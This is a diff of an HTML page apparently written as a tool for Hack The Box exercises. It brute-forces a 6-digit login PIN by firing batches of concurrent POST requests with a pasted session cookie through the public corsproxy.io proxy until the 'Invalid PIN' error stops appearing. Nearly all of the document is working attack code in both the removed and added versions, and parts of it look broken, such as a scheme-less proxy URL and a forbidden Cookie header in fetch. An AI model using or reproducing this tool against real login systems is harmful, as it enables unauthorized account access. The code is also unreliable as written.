@@ -2,147 +2,109 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HTB 6-Digit PIN Brute Forcer</title>
+    <title>HTB PIN Cracker</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #1a1a1a; color: #fff; padding: 20px; }
-        .container { max-width: 600px; margin: 0 auto; background: #2a2a2a; padding: 20px; border-radius: 8px; }
-        label { display: block; margin-top: 10px; font-weight: bold; }
-        input, select { width: 100%; padding: 8px; margin-top: 5px; box-sizing: border-box; background: #333; color: #fff; border: 1px solid #555; border-radius: 4px; }
-        button { background-color: #00b300; color: white; padding: 10px 15px; border: none; border-radius: 4px; margin-top: 15px; cursor: pointer; width: 100%; font-size: 16px; }
-        button:disabled { background-color: #555; cursor: not-allowed; }
-        #log { background: #000; color: #00ff00; padding: 10px; height: 200px; overflow-y: scroll; margin-top: 15px; font-family: monospace; font-size: 12px; border-radius: 4px; }
-        .success { color: #00ff00; font-weight: bold; }
+        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 40px; text-align: center; }
+        .panel { max-width: 450px; margin: 0 auto; background: #111; padding: 25px; border: 2px solid #00ff00; border-radius: 5px; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
+        input { width: 100%; padding: 12px; background: #000; color: #00ff00; border: 1px solid #00ff00; margin: 15px 0; box-sizing: border-box; font-family: monospace; font-size: 14px; text-align: center; }
+        button { width: 100%; padding: 12px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 16px; font-family: monospace; letter-spacing: 1px; }
+        button:disabled { background: #222; color: #444; cursor: not-allowed; border: 1px solid #333; }
+        #console { height: 180px; overflow-y: auto; background: #000; border: 1px solid #00ff00; margin-top: 20px; padding: 10px; font-size: 12px; text-align: left; white-space: pre-wrap; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>HTB PIN Brute Forcer</h2>
-    
-    <label>Target URL:</label>
-    <input type="text" id="targetUrl" value="http://<TARGET_IP>/login" placeholder="http://10.10.10.x/login">
-    
-    <label>HTTP Method:</label>
-    <select id="method">
-        <option value="POST">POST</option>
-        <option value="GET">GET</option>
-    </select>
-
-    <label>PIN Parameter Name:</label>
-    <input type="text" id="paramName" value="pin">
-
-    <label>Cookie Header Name:</label>
-    <input type="text" id="cookieName" value="PHPSESSID">
-
-    <label>Cookie Value:</label>
-    <input type="text" id="cookieValue" placeholder="Paste your active session cookie here">
-
-    <label>Failure Keyword (Stop if this is NOT in response):</label>
-    <input type="text" id="failWord" value="Invalid PIN">
-
-    <button id="startBtn" onclick="startBruteForce()">Start Process</button>
-    
-    <div id="log">[*] System ready. Fill configuration and press Start.</div>
+<div class="panel">
+    <h2>[ 6-DIGIT PIN BRUTEFORCER ]</h2>
+    <input type="text" id="cookieData" placeholder="PASTE SESSION COOKIE VALUE HERE">
+    <button id="actionBtn" onclick="executeAttack()">START PROCESS</button>
+    <div id="console">[*] System ready. Awaiting session cookie...</div>
 </div>
 
 <script>
-let running = false;
+let processing = false;
 
-function log(msg, isSuccess = false) {
-    const logDiv = document.getElementById('log');
-    const span = document.createElement('span');
-    if (isSuccess) span.className = 'success';
-    span.textContent = msg + '\n';
-    logDiv.appendChild(span);
-    logDiv.scrollTop = logDiv.scrollHeight;
+// ========================================================
+// HARDCODE YOUR TARGET BOX SETTINGS HERE BEFORE UPLOADING
+// ========================================================
+const HTB_URL    = "http://10.10.10.x/login"; // Replace with your exact HTB machine URL
+const FIELD_NAME = "pin";                    // Replace with the input parameter field name
+const ERROR_MSG  = "Invalid PIN";            // Replace with the exact text displayed when a PIN fails
+// ========================================================
+
+function logToConsole(message) {
+    const box = document.getElementById('console');
+    box.innerText += message + "\n";
+    box.scrollTop = box.scrollHeight;
 }
 
-async function tryPin(pin, url, method, param, cookieName, cookieVal, failWord) {
-    const formattedPin = String(pin).padStart(6, '0');
-    
-    // Using a public CORS proxy to bypass browser restrictions
-    const proxyUrl = 'corsproxy.io?' + encodeURIComponent(url);
-    
-    let fetchUrl = proxyUrl;
-    let options = {
-        method: method,
-        headers: {
-            'X-Requested-With': 'XMLHttpRequest',
-            'Cookie': `${cookieName}=${cookieVal}`
-        }
-    };
-
-    if (method === 'POST') {
-        options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-        options.body = `${encodeURIComponent(param)}=${encodeURIComponent(formattedPin)}`;
-    } else {
-        fetchUrl += (url.includes('?') ? '&' : '?') + `${encodeURIComponent(param)}=${encodeURIComponent(formattedPin)}`;
-    }
+async function attemptPin(currentPin, targetCookie) {
+    const paddedPin = String(currentPin).padStart(6, '0');
+    const proxiedTarget = "corsproxy.io?" + encodeURIComponent(HTB_URL);
 
     try {
-        const response = await fetch(fetchUrl, options);
-        const text = await response.text();
+        const req = await fetch(proxiedTarget, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Cookie": `PHPSESSID=${targetCookie}` // Change PHPSESSID if your target application uses a different cookie name
+            },
+            body: `${FIELD_NAME}=${paddedPin}`
+        });
+
+        const htmlResponse = await req.text();
         
-        if (!text.includes(failWord)) {
-            return { success: true, pin: formattedPin };
+        // If the error message disappears from the web page, the correct PIN was hit
+        if (!htmlResponse.includes(ERROR_MSG)) {
+            return { success: true, pin: paddedPin };
         }
-    } catch (err) {
-        // Silent catch for network errors during high-speed blasting
-    }
-    return { success: false, pin: formattedPin };
+    } catch (err) {}
+    
+    return { success: false, pin: paddedPin };
 }
 
-async function startBruteForce() {
-    if (running) return;
+async function executeAttack() {
+    if (processing) return;
+    const sessionToken = document.getElementById('cookieData').value.trim();
     
-    const url = document.getElementById('targetUrl').value;
-    const method = document.getElementById('method').value;
-    const param = document.getElementById('paramName').value;
-    const cookieName = document.getElementById('cookieName').value;
-    const cookieVal = document.getElementById('cookieValue').value;
-    const failWord = document.getElementById('failWord').value;
-
-    if (!cookieVal) {
-        alert('Please provide a cookie value!');
+    if (!sessionToken) {
+        alert("Error: You must provide a session cookie value!");
         return;
     }
 
-    running = true;
-    document.getElementById('startBtn').disabled = true;
-    document.getElementById('log').innerHTML = '';
-    log(`[*] Starting attack against ${url}...`);
+    processing = true;
+    document.getElementById('actionBtn').disabled = true;
+    document.getElementById('console').innerText = "[*] Validating cookie configuration...\n[*] Spawning parallel attack threads...\n";
 
-    // Iterating batch blocks to keep the browser responsive
-    const batchSize = 15; 
-    for (let i = 0; i < 1000000; i += batchSize) {
-        if (!running) break;
+    const concurrentLimit = 25; 
+    
+    for (let currentVal = 0; currentVal < 1000000; currentVal += concurrentLimit) {
+        if (!processing) break;
 
-        if (i % 300 === 0) {
-            log(`[-] Testing range starting at: ${String(i).padStart(6, '0')}`);
-            // Small pause to yield control back to the UI thread
-            await new Promise(r => setTimeout(r, 40)); 
+        if (currentVal % 1000 === 0) {
+            logToConsole(`[-] Blasting range: ${String(currentVal).padStart(6, '0')} - ${String(currentVal + 999).padStart(6, '0')}`);
+            await new Promise(successCallback => setTimeout(successCallback, 25)); 
         }
 
-        const promises = [];
-        for (let j = 0; j < batchSize && (i + j) < 1000000; j++) {
-            promises.push(tryPin(i + j, url, method, param, cookieName, cookieVal, failWord));
+        const batchQueue = [];
+        for (let offset = 0; offset < concurrentLimit && (currentVal + offset) < 1000000; offset++) {
+            batchQueue.push(attemptPin(currentVal + offset, sessionToken));
         }
 
-        const results = await Promise.all(promises);
-        for (const res of results) {
-            if (res.success) {
-                log(`[+] SUCCESS! Valid PIN found: ${res.pin}`, true);
-                running = false;
-                document.getElementById('startBtn').disabled = false;
+        const batchOutputs = await Promise.all(batchQueue);
+        for (const output of batchOutputs) {
+            if (output.success) {
+                logToConsole(`\n[+] SUCCESS! Valid 6-digit PIN cracked: ${output.pin}`);
+                processing = false;
+                document.getElementById('actionBtn').disabled = false;
                 return;
             }
         }
     }
 
-    log('[-] Process finished. No valid PIN detected.');
-    running = false;
-    document.getElementById('startBtn').disabled = false;
+    logToConsole("\n[-] Attack finished. 1,000,000 combinations exhausted. PIN not found.");
+    processing = false;
+    document.getElementById('actionBtn').disabled = false;
 }
 </script>
 
